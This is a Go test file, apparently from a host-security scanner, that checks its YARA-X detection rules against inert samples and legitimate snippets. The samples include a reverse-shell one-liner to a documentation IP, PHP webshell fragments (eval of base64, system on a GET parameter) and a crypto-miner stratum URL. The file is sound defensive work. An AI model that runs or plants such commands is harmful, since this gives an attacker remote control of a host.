package rules

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"testing"

	"github.com/guigallina27/vigiahost/internal/engines/yarax"
)

// Amostras inertes: cada uma contém o padrão que a regra procura, mas não é código executável (o PHP é cortado no
// meio da expressão e termina em comentário aberto). São montadas com strings.Join para que o arquivo-fonte não
// contenha os padrões inteiros e não seja colocado em quarentena por antivírus da máquina de desenvolvimento.
func j(parts ...string) string { return strings.Join(parts, "") }

var positives = map[string]string{
	"vh_php_eval_decodificado":            j("<?php /* amostra inerte */ ev", "al(base64", "_decode( /*"),
	"vh_php_execucao_de_parametro":        j("<?php /* amostra inerte */ sys", "tem($_G", "ET['c'] /*"),
	"vh_php_funcao_variavel_de_parametro": j("<?php /* amostra inerte */ $_GET['f'](", "$_GET['x'] /*"),
	"vh_php_upload_direto": j("<?php /* amostra inerte */ ?><form enctype=\"multipart/form-data\"><?php move_uploaded",
		"_file($_FILES['f']['tmp_name'], $_FILES['f']['name'] /*"),
	"vh_php_blob_codificado_com_eval": j("<?php /* amostra inerte */ $x = '", strings.Repeat("QUJD", 800), "'; ev", "al( /*"),
	"vh_php_ofuscacao_chr":            j("<?php /* amostra inerte */ ev", "al(", strings.Repeat("chr(65).", 45), " /*"),
	"vh_php_shell_reverso":            j("<?php /* amostra inerte */ fsock", "open( /* '/bin/", "sh' */ proc_", "open( /*"),
	"vh_php_wso_filesman":             j("<?php /* amostra inerte */ $default_action = 'Files", "Man'; /*"),
	"vh_php_preg_replace_e":           j("<?php /* amostra inerte */ preg_rep", "lace('/x/e', $_GET['c'] /*"),
	"vh_minerador_stratum":            j("# amostra inerte\nurl = stratum", "+tcp://pool.invalid:3333\n"),
	"vh_minerador_configuracao":       j("{\"_\": \"amostra inerte\", \"donate", "-level\": 0, \"pools\": []}"),
	"vh_shell_reverso_script":         j("# amostra inerte\nbash -i >& /dev/", "tcp/192.0.2.1/4444 0>&1\n"),
	"vh_js_injecao_ofuscada":          j("/* amostra inerte */ ev", "al(String.fromCharCode(97, 98, 99", " /*"),
	"vh_elf_upx":                      j("\x7fELF\x02\x01\x01\x00", strings.Repeat("\x00", 100), "UP", "X!"),
	"vigiahost_controle_positivo":     "VIGIAHOST-CONTROLE-POSITIVO-INERTE-7f3c9a1e",
}

// Negativos: trechos legítimos que já geraram (ou poderiam gerar) falso positivo.
var negatives = map[string]string{
	"markdown_em_comentario": "<?php\n/**\n * Copia `$_POST['user_login']` para `$_GET[$var]`.\n */\nfunction f() {}\n",
	"wp_move_uploaded":       "<?php\n$moved = move_uploaded_file( $file['tmp_name'], $new_file );\n",
	"base64_sem_eval":        "<?php\n$img = base64_decode( $data );\necho esc_html( $x );\n",
	"exec_sem_parametro":     "<?php\nexec( 'ls', $out );\n$cmd = escapeshellarg( $_GET['x'] );\n",
	"js_fromcharcode":        "var s = String.fromCharCode(65);\nconsole.log(s);\n",
	"texto":                  "Documentação sobre stratum de rochas sedimentares e pools de conexão.\n",
}

func compileForTest(t *testing.T) (string, string) {
	t.Helper()
	if runtime.GOOS != "linux" {
		t.Skip("YARA-X só no laboratório Linux")
	}
	yr, err := exec.LookPath("yr")
	if err != nil {
		t.Skip("yr não instalado")
	}
	dir := t.TempDir()
	set, err := Materialize(filepath.Join(dir, "src"))
	if err != nil {
		t.Fatal(err)
	}
	v, err := yarax.Version(context.Background(), yr)
	if err != nil {
		t.Fatal(err)
	}
	out, err := Compiled(context.Background(), yr, v, dir, set)
	if err != nil {
		t.Fatal(err)
	}
	return yr, out
}

func scanTexts(t *testing.T, yr, compiled string, texts []string) [][]yarax.Match {
	t.Helper()
	files := make([]*os.File, len(texts))
	for i, txt := range texts {
		p := filepath.Join(t.TempDir(), "amostra")
		if err := os.WriteFile(p, []byte(txt), 0o600); err != nil {
			t.Fatal(err)
		}
		f, err := os.Open(p)
		if err != nil {
			t.Fatal(err)
		}
		defer func() { _ = f.Close() }()
		files[i] = f
	}
	s := &yarax.Scanner{Bin: yr, Rules: compiled}
	res, err := s.ScanFiles(context.Background(), files)
	if err != nil {
		t.Fatal(err)
	}
	return res.Matches
}

func TestRegrasDetectamAmostras(t *testing.T) {
	yr, compiled := compileForTest(t)
	var names, texts []string
	for n, txt := range positives {
		names = append(names, n)
		texts = append(texts, txt)
	}
	matches := scanTexts(t, yr, compiled, texts)
	for i, n := range names {
		var got []string
		for _, m := range matches[i] {
			got = append(got, m.Rule)
		}
		if !slices.Contains(got, n) {
			t.Errorf("%s não detectou a própria amostra (casou: %v)", n, got)
		}
	}
}

func TestRegrasSemFalsoPositivo(t *testing.T) {
	yr, compiled := compileForTest(t)
	var names, texts []string
	for n, txt := range negatives {
		names = append(names, n)
		texts = append(texts, txt)
	}
	matches := scanTexts(t, yr, compiled, texts)
	for i, n := range names {
		for _, m := range matches[i] {
			t.Errorf("%s: falso positivo da regra %s", n, m.Rule)
		}
	}
}

func TestMetadadosObrigatorios(t *testing.T) {
	names, _ := builtin.ReadDir("vigiahost")
	for _, e := range names {
		data, _ := builtin.ReadFile("vigiahost/" + e.Name())
		for _, block := range strings.Split(string(data), "\nrule ")[1:] {
			name := strings.Fields(block)[0]
			for _, key := range []string{"description", "severity", "category", "author", "license"} {
				if !strings.Contains(block, key+" = ") {
					t.Errorf("%s: falta o metadado %s", name, key)
				}
			}
			if _, ok := positives[name]; !ok {
				t.Errorf("%s: sem amostra positiva no teste", name)
			}
		}
	}
}
